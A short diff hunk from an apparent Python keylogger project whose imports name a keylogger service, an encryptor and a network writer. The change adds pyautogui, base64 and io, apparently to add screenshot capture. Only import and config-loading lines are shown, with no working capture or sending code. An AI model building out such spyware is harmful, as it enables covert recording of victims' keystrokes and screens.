@@ -1,7 +1,7 @@
 from service import KeyLoggerService, FileWriter, Encryptor,NetworkWriter
 from Interface import IKeyLoggerManager
 from pynput.keyboard import Listener
-import threading, time, requests, sys,yaml
+import threading, time, requests, sys,yaml, pyautogui, base64, io
 
 with open("config.yaml", "r") as f:
     config = yaml.safe_load(f)
